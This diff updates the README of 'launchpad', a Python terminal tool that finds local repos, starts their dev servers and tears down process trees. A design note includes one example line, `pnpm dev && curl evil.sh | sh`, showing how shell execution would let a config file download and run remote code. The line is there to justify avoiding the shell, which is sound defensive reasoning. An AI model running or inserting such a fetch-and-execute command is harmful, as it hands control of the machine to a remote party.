@@ -1,69 +1,126 @@
 # launchpad
 
-Terminal project launcher. Pick a repo, get its **whole** dev environment running — editor, dev servers, sidecar processes — in one keystroke, then tear it all down with one more.
+**Pick a repo. Get its entire dev environment running. One keystroke.**
 
-Scans **31 repos in 154 ms** (median of 5 cold runs, Windows 11, NVMe) and auto-derives run commands for **20 of them** with zero configuration. The other 11 are libraries and CLIs with nothing to serve; a 4-line `launcher.toml` covers anything detection can't infer.
+Editor opens, every dev server and sidecar starts, ports are checked before anything boots, logs stream into one pane, and one more keystroke tears the whole process tree down.
+
+Scans **32 repos in 151 ms** (median of 7 cold runs, Windows 11, NVMe) and derives run commands for **18 of them with zero configuration**. 159 tests, 82% coverage, pyright clean.
 
 ```
 $ launch
-  ▸ collabboard      TS     dev                 ○ —
-    relay            Go+TS  gateway + web       ● running
-    ledger-engine    Java   bootRun             ○ —
-    regin            Py     —                   ○ —
-
-[enter] launch  [e] editor  [s] stop  [/] filter  [r] rescan  [q] quit
-
-→ relay
-  ✓ editor C:/Users/tdmne/Desktop/experiments/relay
-  ✓ gateway pid 21884       ready
-  ✓ web     pid 12312 :3000 ready
+┌ launchpad ──────────────────────────────────────────────────────────┐
+│   project                stack   tasks              branch          │
+│ ● relay                  Go+TS   gateway + web      main *3         │
+│ ○ collabboard            TS      dev                develop ↑1      │
+│ ○ ledger-engine          Java    bootRun            main            │
+│ ○ regin                  Py      —                  main *12        │
+├─────────────────────────────────────────────────────────────────────┤
+│ → relay                                                             │
+│   ! web: .env.example exists but .env is missing                    │
+│   ✓ editor C:/Users/tdmne/Desktop/experiments/relay                 │
+│   ✓ gateway pid 21884                                               │
+│   ✓ web     pid 12312 :3000 ready                                   │
+│ [gateway] listening on :8080                                        │
+│ [web]     ✓ Ready in 1.4s                                           │
+└─────────────────────────────────────────────────────────────────────┘
+ enter launch · e editor · s stop · R restart · d doctor · f force · / filter
 ```
+
+## Why this exists
+
+Every morning starts the same way: `cd` somewhere, open the editor, start the API, start the web app, start Redis, wait, find the port is still held by yesterday's zombie, kill it, start again.
+
+Existing tools each solve one slice:
+
+| | Finds your repos | Runs N processes | Windows-native | Zero config |
+|---|---|---|---|---|
+| tmuxinator / overmind / foreman | ✗ | ✓ | ✗ | ✗ |
+| mprocs / concurrently | ✗ | ✓ | ~ | ✗ |
+| zoxide / tmux-sessionizer | ✓ (jump only) | ✗ | ~ | ✓ |
+| docker compose | ✗ | ✓ (containers) | ✓ | ✗ |
+| **launchpad** | **✓** | **✓** | **✓** | **✓** |
+
+launchpad is the intersection: it *finds* your projects, *infers* how to run them, and manages the processes — on Windows as a first-class target, not an afterthought.
 
 ## Install
 
 ```sh
 git clone https://github.com/Surge77/launchpad && cd launchpad
-python -m venv .venv && .venv/Scripts/activate     # source .venv/bin/activate on Unix
-pip install -e ".[dev]"
+python -m venv .venv
+.venv\Scripts\activate           # Windows
+source .venv/bin/activate        # macOS / Linux
+pip install -e .
 ```
 
-Point it at wherever your repos live:
+Point it at your code:
 
 ```sh
-setx LAUNCHPAD_ROOT "C:\Users\you\Desktop\experiments"    # or --root on every call
+setx LAUNCHPAD_ROOT "C:\Users\you\Desktop\experiments"     # Windows
+export LAUNCHPAD_ROOT="$HOME/code"                         # Unix (add to your shell rc)
 ```
 
-## Usage
+Then just run `launch`.
 
-| Command | Does |
-|---------|------|
-| `launch` | TUI: browse, filter, launch, stop |
-| `launch ls` | List every project, its stack, its tasks, and whether it's running |
-| `launch up <name>` | Launch by name (partial match works: `launch up collab`) |
-| `launch ps` | Show every process launchpad is tracking |
-| `launch stop [name]` | Stop one project, or everything if name is omitted |
-| `launch logs <name>` | Print log file paths for a project's tasks |
+## Commands
 
-Flags: `--no-editor` starts processes only, `--no-wait` skips port readiness polling.
+| Command | What it does |
+|---------|--------------|
+| `launch` | TUI — browse, filter, launch, restart, stop, watch logs |
+| `launch ls` | Every project, stack, tasks, run state. `--git` adds branch/dirty, `--json` for scripts |
+| `launch up <name>...` | Launch one or more projects. Partial names work (`launch up collab`) |
+| `launch restart <name>` | Stop, wait for the port to actually release, start again |
+| `launch stop [name]` | Stop one project, or everything if omitted |
+| `launch ps` | Every process launchpad is tracking. `--json` supported |
+| `launch doctor [name]` | Explain why a project *would* fail to launch — before you launch it |
+| `launch logs <name>` | Task logs. `-f` follows, `-n` sets history depth |
 
-## Detection
+Flags on `up`: `--no-editor` (processes only), `--no-wait` (skip port readiness), `--force` (kill whatever holds a needed port, then launch).
 
-No config needed when the repo follows convention:
+### TUI keys
+
+`enter` launch · `e` editor only · `s` stop · `R` restart · `d` doctor · `f` force launch · `/` filter · `r` rescan · `q` quit
+
+## Features
+
+**Zero-config stack detection.** Reads the repo's own manifests and lockfiles:
 
 | Marker | Command | Port |
 |--------|---------|------|
-| `package.json` with `dev`/`start`/`serve` | `pnpm dev` / `yarn dev` / `bun dev` / `npm run dev` (from the lockfile) | 3000 Next, 5173 Vite |
+| `package.json` with `dev`/`start`/`serve` | `pnpm dev` / `yarn dev` / `bun dev` / `npm run dev`, chosen by lockfile | 3000 Next, 5173 Vite |
 | `pom.xml` with spring-boot | `mvn spring-boot:run` | 8080 |
 | `build.gradle[.kts]` | `gradlew bootRun` | 8080 |
 | `Cargo.toml` | `cargo run` | — |
 | `go.mod` | `go run ./...` | — |
 | `pyproject.toml` / `requirements.txt` with fastapi / django / flask | `uvicorn` / `runserver` / `flask run` | 8000 / 8000 / 5000 |
 
-Monorepos are handled: a repo whose root has no manifest gets its immediate subdirectories scanned, and each becomes its own task named after the directory — `relay` comes out as `Go+TS` with `gateway + web`.
+**Monorepo aware.** A repo with no root manifest gets its subdirectories scanned, each becoming a task named after its folder — `relay` resolves to `Go+TS`, tasks `gateway + web`.
 
-## `launcher.toml`
+**Pre-flight checks.** Before spawning anything, launchpad verifies the executable is on PATH, the working directory exists, the port is free — *and names the process squatting on it*. It also flags the classic silent killer: a `.env.example` with no `.env`. Errors block the launch; warnings just print.
 
-Drop this in any repo to override detection completely. Tasks start in listed order.
+```
+$ launch doctor collabboard
+
+collabboard (TS)
+  ✓ dev: pnpm found
+  ✗ dev: port 3000 already held by pid 24180 (node.exe)
+  ! collabboard: .env.example exists but .env is missing
+
+1 blocking issue(s)
+```
+
+`launch up collabboard --force` kills the squatter and proceeds.
+
+**Live log streaming.** Every task's stdout/stderr lands in a log file and streams into the TUI pane, prefixed per task. `launch logs <name> -f` does the same in a plain terminal.
+
+**Frecency ordering.** Projects you launch often and recently rise to the top — one recent launch outranks a month-stale favourite, so the list tracks what you're working on now.
+
+**Git status at a glance.** Branch, dirty count, ahead/behind per repo, fetched through a thread pool: 32 repos cost 383 ms total instead of the ~2 s a serial loop of `git status` would take. Off by default so the plain list stays instant.
+
+**Safe restarts.** `restart` kills the process tree, waits for the port to leave `TIME_WAIT`, *then* relaunches — no self-inflicted `EADDRINUSE`.
+
+## Configuration
+
+Detection is a fallback. Drop a `launcher.toml` in any repo for full control:
 
 ```toml
 editor = "code"            # optional; else $LAUNCHPAD_EDITOR, else code
@@ -83,27 +140,40 @@ name = "web"
 cmd  = "pnpm dev"
 cwd  = "apps/web"
 port = 3000
-open = true                # open localhost:3000 once the port accepts connections
+open = true                # open the browser once the port accepts connections
 env  = { NEXT_PUBLIC_API = "http://localhost:8080" }
 ```
 
-A task with a `port` blocks until that port accepts a connection (30 s cap) before the next line prints, so `open = true` never races a half-booted server.
+Tasks start in order, and a task with a `port` blocks until that port accepts a connection (30 s cap) before the next starts — so `open = true` never races a half-compiled server, and `api` is genuinely up before `web` talks to it.
 
-## Design notes
+Full reference: [docs/CONFIGURATION.md](docs/CONFIGURATION.md). Internals: [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md).
 
-**Process identity, not just PIDs.** State records `(pid, create_time)`. After a hard crash the OS can hand a dead server's PID to something unrelated, and a PID-only `stop` would kill a stranger; matching creation time makes the check exact. Dead entries are pruned from disk on every read.
+## Design decisions worth knowing
 
-**No shell.** Task commands come from a repo's `launcher.toml`, so they never reach a shell — `shell=True` would let `pnpm dev && anything` run a second command. `argv[0]` is resolved through `shutil.which()`, which is also what makes Windows `.cmd` shims (`pnpm`, `gradlew`) work without one. `cwd` is rejected if it's absolute or contains `..`, checked against both POSIX and Windows path flavours (`Path("/etc").is_absolute()` is `False` on Windows).
+**Process identity, not bare PIDs.** State stores `(pid, create_time)`. After a hard crash the OS can recycle a dead server's PID, and a PID-only `stop` would kill an unrelated process; matching creation time makes the check exact. Dead entries are pruned on every read.
 
-**Full-tree teardown.** `stop` walks children recursively, sends `terminate`, waits 5 s, then `kill`s survivors — a `next dev` parent exiting without its worker leaves an orphan holding port 3000.
+**No shell, ever.** Task commands come from a repo's config file, so they never touch a shell — `shell=True` would make `pnpm dev && curl evil.sh | sh` a working config. `argv[0]` is resolved with `shutil.which()`, which is also precisely what makes Windows `.cmd` shims (`pnpm`, `gradlew`) run without one. `cwd` is rejected if absolute or containing `..`, validated against both POSIX and Windows path flavours — `Path("/etc").is_absolute()` is `False` on Windows, so a single check would miss it.
 
-Logs stream to `%LOCALAPPDATA%\launchpad\logs\<project>-<task>.log`; state lives beside them in `state.json`.
+**Full-tree teardown.** `stop` walks children recursively, sends `terminate`, waits 5 s, then `kill`s survivors. A `next dev` parent can exit while its worker keeps port 3000 — the orphan then breaks your *next* launch and looks like launchpad's bug.
 
-## Tests
+**Fast by default, slow only on request.** Discovery touches the filesystem only. Git status is opt-in (`--git`) and threaded, so `launch ls` stays at ~151 ms across 32 repos.
+
+State and logs live in `%LOCALAPPDATA%\launchpad\` (Windows) or `~/.local/share/launchpad/` (Unix); override with `LAUNCHPAD_HOME`.
+
+## Development
 
 ```sh
+pip install -e ".[dev]"
 python -m pytest --cov=launchpad --cov-report=term-missing
 python -m pyright
 ```
 
-**80 tests, 81% line coverage, 0 pyright errors.** Non-UI modules run 82–99%; `tui.py` sits at 30% by design — Textual widget interaction is covered by hand, not by unit tests. The launch → probe → stop cycle is verified end-to-end against a real HTTP server binding a real port.
+**159 tests · 82% line coverage · 0 pyright errors.**  Non-UI modules run 89–97%; `tui.py` is at 24% by design — Textual widget wiring is verified by hand, and the launch → probe → stop cycle is covered end-to-end against a real HTTP server binding a real port.
+
+CI runs both gates on Linux, macOS, and Windows against Python 3.11 and 3.12.
+
+See [CONTRIBUTING.md](CONTRIBUTING.md) for the workflow and [CLAUDE.md](CLAUDE.md) if you're working on this with an AI agent.
+
+## License
+
+MIT — see [LICENSE](LICENSE).
